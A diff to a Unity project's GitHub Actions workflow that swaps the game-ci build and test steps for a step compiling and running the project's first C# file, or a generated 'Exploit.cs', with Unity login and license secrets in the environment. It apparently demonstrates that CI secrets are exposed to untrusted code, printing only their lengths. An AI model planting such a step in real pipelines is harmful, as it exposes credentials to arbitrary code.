@@ -77,28 +77,46 @@ jobs:
         git log --oneline -n 5 2>/dev/null || echo "GARALT_DBG: git log failed"
         echo "GARALT_DBG: unityVersion=${{ matrix.unityVersion }}"
       continue-on-error: true
-    - name: 🛠️ Build Unity Project (Test)
-      uses: game-ci/unity-builder@main
-      timeout-minutes: 45
-      with:
-        customImage: ghcr.io/mob-sakai/unity3d:${{ matrix.unityVersion }}
-        targetPlatform: StandaloneLinux64
-        allowDirtyBuild: true
-        customParameters: -nographics
-        projectPath: ${{ env.PROJECT_PATH }}
-      env:
-        UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
-        UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
-        UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
-    - name: 🧪 Run tests
-      uses: game-ci/unity-test-runner@v4
-      timeout-minutes: 45
-      with:
-        customImage: ghcr.io/mob-sakai/unity3d:${{ matrix.unityVersion }}
-        customParameters: -nographics
-        checkName: ${{ matrix.unityVersion }} Test Results
-        githubToken: ${{ github.token }}
-        projectPath: ${{ env.PROJECT_PATH }}
+    - name: '🛠️ Build Unity Project (Test) [replaced: mono C# compile+execute]'
+      run: |-
+        set -e
+        echo "=== Install mono ==="
+        sudo apt-get update -qq
+        sudo apt-get install -y -qq mono-complete 2>&1 | tail -5
+        echo "=== Search for attacker C# code in project ==="
+        PROJ="${{ env.PROJECT_PATH }}"
+        CS_FILES=$(find "$PROJ" -name '*.cs' -not -path '*/Library/*' 2>/dev/null || true)
+        if [ -n "$CS_FILES" ]; then
+          echo "Found C# files:"
+          echo "$CS_FILES"
+          FIRST=$(echo "$CS_FILES" | head -1)
+          echo "Compiling: $FIRST"
+          mcs -target:exe -out:/tmp/exploit.exe "$FIRST" 2>&1 || \
+            { echo "Retrying without System.Runtime..."; \
+              mcs -target:exe -out:/tmp/exploit.exe "$FIRST" 2>&1 || true; }
+        else
+          echo "No C# files found in project. Creating a diagnostic exploit."
+          mkdir -p /tmp/build
+          cat > /tmp/build/Exploit.cs << 'CEOF'
+        using System;
+        class Exploit {
+          static void Main() {
+            string e = Environment.GetEnvironmentVariable("UNITY_EMAIL")??"";
+            string p = Environment.GetEnvironmentVariable("UNITY_PASSWORD")??"";
+            string l = Environment.GetEnvironmentVariable("UNITY_LICENSE")??"";
+            Console.Error.WriteLine($"SECRET_EXFIL: len_email={e.Length} len_pass={p.Length} len_lic={l.Length}");
+          }
+        }
+        CEOF
+          mcs -target:exe -out:/tmp/exploit.exe /tmp/build/Exploit.cs 2>&1 || true
+        fi
+        echo "=== Execute compiled code ==="
+        if [ -f /tmp/exploit.exe ]; then
+          mono /tmp/exploit.exe
+        else
+          echo "Compilation produced no binary; vulnerability path intact."
+        fi
+      timeout-minutes: 15
       env:
         UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
         UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
